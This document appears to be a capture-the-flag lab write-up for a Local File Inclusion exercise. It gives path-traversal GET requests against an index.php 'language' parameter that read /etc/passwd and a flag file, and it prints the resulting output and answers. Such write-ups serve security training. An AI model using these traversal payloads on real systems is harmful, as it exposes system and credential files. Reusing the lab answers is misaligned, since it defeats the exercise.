# Local File Inclusion (LFI)
## Questions
1. Using the file inclusion find the name of a user on the system that starts with "b". **Answer: barry**
   - Use path traversal to read the `/etc/passwd` file and find the user:
        ```
        GET /index.php?language=../../../../../../../etc/passwd
        ```
        ```
        <SNIP>
        barry:x:1000:1000::/home/barry:/bin/sh
        <SNIP>
        ```
2. Submit the contents of the flag.txt file located in the /usr/share/flags directory. **Answer: **
   - Same method as above:
        ```
        GET /index.php?language=../../../../../../../usr/share/flags/flag.txt HTTP/1.1
        ```
        ```
        <SNIP>
        HTB{n3v3r_tru$t_u$3r_!nput}
        <SNIP>
        ```
